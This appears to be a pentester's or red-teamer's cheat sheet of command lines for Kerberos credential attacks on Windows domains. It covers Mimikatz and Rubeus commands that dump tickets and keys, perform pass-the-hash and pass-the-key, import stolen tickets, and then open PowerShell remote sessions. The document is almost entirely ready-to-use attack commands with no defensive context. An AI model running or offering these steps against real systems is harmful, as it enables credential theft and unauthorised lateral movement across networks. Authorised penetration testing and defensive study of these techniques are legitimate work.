Mimikatz / Rubeus

1. harvest all tickets(need admin), automatically save all .kirbi files: 
    -mimikatz.exe privilege::debug "sekurlsa::tickets /export"
or (no admin)
    -rubeus.exe dump /nowrap

2. Extract Kerberos keys, aes256 or rc4
    -mimikatz.exe privilege::debug "sekurlsa::ekeys"
    -rubeus.exe triage

3. PtH or Pass the Key
    -mimikatz.exe privilege::debug "sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<ntlm from sekurlsa::logonpasswords>
    -rubeus.exe asktgt /domain:<domain> /user:<user> /aes256: <aes256 or rc4 from #2> /ptt(if import needed)

4. import ticket
    -rubeus.exe ptt ticket:<.kirbi file loc> or <.kirbi base64 content>
    -mimikatz.exe privilege::debug "kerberos::ptt <.kirbi file loc>

5. Powershell remote: if ticket of admin, remote management users group, or powershell remoting permission
    -Enter-PSSession -ComputerName <Machine name>
